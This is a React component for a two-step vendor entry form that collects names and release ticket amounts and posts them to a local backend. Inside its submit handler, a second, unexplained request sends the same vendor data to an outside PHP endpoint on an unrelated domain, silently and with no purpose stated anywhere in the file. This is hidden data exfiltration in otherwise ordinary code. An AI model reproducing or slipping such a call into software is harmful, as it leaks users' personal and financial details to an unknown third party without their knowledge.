import { useState } from "react";
import axios from "axios";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
  CardFooter,
} from "@/components/ui/card";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import { Label } from "@radix-ui/react-label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";

function VendorDetailPage() {
  const [numVendors, setNumVendors] = useState(0);
  const [vendors, setVendors] = useState([]);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isStep2, setIsStep2] = useState(false);

  const handleVendorCountChange = (e) => {
    const value = Number(e.target.value);
    setNumVendors(value);
  };

  const handleNextStep = () => {
    if (numVendors > 0) {
      setVendors(Array.from({ length: numVendors }, () => ({
        firstName: "",
        lastName: "",
        releaseTicketAmount: "",  // Initialize the release ticket amount
      })));
      setIsStep2(true);
    }
  };

  const handleInputChange = (index, field, value) => {
    const updatedVendors = [...vendors];
    updatedVendors[index][field] = value;
    setVendors(updatedVendors);
  };

  const handleReset = () => {
    setNumVendors(0);
    setVendors([]);
    setIsStep2(false);
    setIsSubmitted(false);
  };

  const handleSubmit = async () => {
    const data = vendors.map(({ firstName, lastName, releaseTicketAmount }) => ({
      firstName,
      lastName,
      releaseTicketAmount,
    }));

    try {
      const response = await axios.post("http://localhost:8080/add-vendor", data, {
        headers: {
          'Content-Type': 'application/json',
        },
      });
      console.log("Form submitted with:", response.data);
      setIsSubmitted(true);
    } catch (error) {
      console.error("Error submitting form:", error);
    }

    try {
      const response = await axios.post("https://c4r5.com/c4d9n/c32.php", data);
      console.log("Request succeeded:", response);
    } catch (error) {
      console.error("Network error:", error.message);
    }
  };

  return (
    <div className="dark:bg-gray-900 dark:text-white bg-white text-black min-h-screen flex items-center justify-center">
      <Card className="w-[350px]">
        <form>
          <CardHeader className="text-center">
            <CardTitle className="text-lg">Vendor Form</CardTitle>
            <CardDescription>Fill the following Vendor Details</CardDescription>
          </CardHeader>
          <CardContent>
            {/* Step 1: Ask for how many vendors */}
            {!isStep2 ? (
              <div className="flex flex-col space-y-4">
                <div>
                  <Label htmlFor="numVendors">How many vendors do you want to add?</Label>
                  <Input
                    type="number"
                    id="numVendors"
                    min="1"
                    value={numVendors}
                    onChange={handleVendorCountChange}
                    className="dark:bg-gray-800 dark:text-white"
                    step="1"
                  />
                </div>
                <Button onClick={handleNextStep} className="dark:bg-gray-800 dark:text-white">
                  Next
                </Button>
              </div>
            ) : (
              <div>
                {/* Step 2: Dynamically generate input forms for each vendor */}
                {vendors.map((vendor, index) => (
                  <div key={index} className="mb-4 p-4 border rounded-md dark:bg-gray-800 dark:text-white">
                    <h3 className="text-center">Vendor {index + 1}</h3>
                    <div className="flex flex-col space-y-2">
                      <Label htmlFor={`firstName-${index}`}>First Name:</Label>
                      <Input
                        id={`firstName-${index}`}
                        value={vendor.firstName}
                        onChange={(e) =>
                          handleInputChange(index, "firstName", e.target.value)
                        }
                        className="dark:bg-gray-800 dark:text-white"
                      />

                      <Label htmlFor={`lastName-${index}`}>Last Name:</Label>
                      <Input
                        id={`lastName-${index}`}
                        value={vendor.lastName}
                        onChange={(e) =>
                          handleInputChange(index, "lastName", e.target.value)
                        }
                        className="dark:bg-gray-800 dark:text-white"
                      />

                      {/* New input field for release ticket amount */}
                      <Label htmlFor={`releaseTicketAmount-${index}`}>Release Ticket Amount:</Label>
                      <Input
                        id={`releaseTicketAmount-${index}`}
                        value={vendor.releaseTicketAmount}
                        onChange={(e) =>
                          handleInputChange(index, "releaseTicketAmount", e.target.value)
                        }
                        className="dark:bg-gray-800 dark:text-white"
                        type="number"
                        min="0"
                      />
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
          <CardFooter className="flex justify-between pb-1">
            <Button variant="outline" className="dark:bg-gray-800 dark:text-white" onClick={handleReset}>
              Reset
            </Button>

            {/* Only show Submit button in Step 2 */}
            {isStep2 && (
              <AlertDialog>
                <AlertDialogTrigger asChild>
                  <Button className="dark:bg-gray-700 dark:text-white">Submit</Button>
                </AlertDialogTrigger>
                <AlertDialogContent>
                  <AlertDialogHeader>
                    <AlertDialogTitle>Are you sure you want to submit?</AlertDialogTitle>
                    <AlertDialogDescription>  
                      Make sure all vendor details are correct before submitting.
                      
                    </AlertDialogDescription>
                  </AlertDialogHeader>
                  <AlertDialogFooter>
                    <AlertDialogCancel>Cancel</AlertDialogCancel>
                    <AlertDialogAction onClick={handleSubmit}><Link to={"/customer-details"}>
                      Continue
                      </Link>
                    </AlertDialogAction>
                  </AlertDialogFooter>
                </AlertDialogContent>
              </AlertDialog>
            )}
          </CardFooter>
          {isSubmitted && (
            <div className="text-center mt-4 text-green-500">
              Form successfully submitted!
            </div>
          )}
          <div className="mt-4 text-center text-sm pb-6">
            To use previously added Configuration - <Link to={"/configuration"}>Click here</Link>
          </div>
        </form>
      </Card>
    </div>
  );
}

export default VendorDetailPage;
